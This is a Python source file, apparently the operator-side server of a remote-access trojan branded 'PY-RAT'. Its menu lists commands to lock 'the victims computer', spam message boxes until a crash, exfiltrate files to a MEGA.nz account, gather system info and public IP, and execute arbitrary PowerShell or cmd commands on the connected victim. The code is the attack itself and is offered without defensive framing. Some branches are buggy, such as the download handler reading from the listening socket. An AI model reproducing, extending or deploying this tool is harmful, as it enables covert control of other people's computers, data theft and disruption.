#admin server
import socket
import base64
from colorama import Fore, Style
import os
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

local_pc = '192.168.178.44' #192.168.178.44
port = 12345
s.bind((local_pc, port))
s.listen()

def start():
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT +
          '@@@@@@@   @@@ @@@             @@@@@@@    @@@@@@   @@@@@@@  ')
    print('@@@@@@@@  @@@ @@@             @@@@@@@@  @@@@@@@@  @@@@@@@  ')
    print('@@!  @@@  @@! !@@             @@!  @@@  @@!  @@@    @@!    ')
    print('!@!  @!@  !@! @!!             !@!  @!@  !@!  @!@    !@!    ')
    print('@!@@!@!    !@!@!   @!@!@!@!@  @!@!!@!   @!@!@!@!    @!!    ')
    print('!!@!!!      @!!!   !!!@!@!!!  !!@!@!    !!!@!!!!    !!!    ')
    print('!!:         !!:               !!: :!!   !!:  !!!    !!:    ')
    print(':!:         :!:               :!:  !:!  :!:  !:!    :!:    ')
    print(' ::          ::               ::   :::  ::   :::     ::    ')
    print(' :           :                 :   : :   :   : :     :     ')
    print(Style.RESET_ALL)

def help():
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "Commands:")
    print("help: shows this message")
    print("message (message): shows messagebox")
    print("say (message): says message")
    print("spam: spams messagebox until crash")
    print("wallpaper (URL): changes the wallpaper to the URL")
    print("lock: locks the victims computer")
    print("upload (filepath): client uploads file to MEGA.nz acount")
    print("download (URL): downloads file from MEGA.nz URL")
    print("info: gets info over victims computer")
    print("play (URL to .wav): plays the sound !!needs to be .wav!!")
    print("p (Command): gets executed as powershell (not all functions working)")
    print("ip: gets public ip on victim")
    print("anything else: is executed in cmd")
    print("\n")
    print(Style.RESET_ALL)



def send(command, conn):
    command_bytes = command.encode(encoding='ascii', errors='backslashreplace')
    command_b64_bytes = base64.b64encode(command_bytes)
    command_b64_string = command_b64_bytes.decode("ascii")
    conn.sendall(command_b64_string.encode())

def recieve(conn):
    data_b64_string = conn.recv(5000)
    # print(data_b64_string)
    data_b64_bytes = data_b64_string  # .encode("ascii")
    data_string_bytes = base64.b64decode(data_b64_bytes)
    data = data_string_bytes.decode("ascii")
    return(data)

start()
help()

while True:
    print("Server listening")
    conn, addr = s.accept ()
    print("Connection to: ", addr)
    print(recieve(conn))

    try:
    #if __name__ == "__main__":
        while True:
            command = input("Command: ")

            if command.find("help") == 0:
                help()

            elif command.find("exit") == 0:
                exit(0)

            elif command.find("upload") == 0:
                file = os.path.basename(command.partition(' ')[2])
                send(command, conn)
                f = open(command.partition(' ')[2],"rb")
                lines = f.read(1024)
                time.sleep(0.5)
                conn.sendall(file.encode())
                time.sleep(0.5)
                while lines:
                    conn.send(lines)
                    lines = f.read(1024)
                f.close()
                time.sleep(0.5)
                conn.sendall(b"end1234")
                print("finished upload")

            elif command.find("download") == 0:
                file = s.recv(5000)
                file_text = s.recv(1024)
                f = open(file.decode(), "wb")
                while not file_text == (b"end1234"):
                    f.write(file_text)
                    file_text = s.recv(1024)
                f.close()
                print("finished")

            else:
                send(command, conn)
                """print("sending...")
                command_bytes = command.encode(encoding='ascii', errors='backslashreplace')
                command_b64_bytes = base64.b64encode(command_bytes)
                command_b64_string = command_b64_bytes.decode("ascii")
                conn.sendall(command_b64_string.encode())"""

                print(recieve(conn))

    except():
        print("Disconnected from: ", addr)
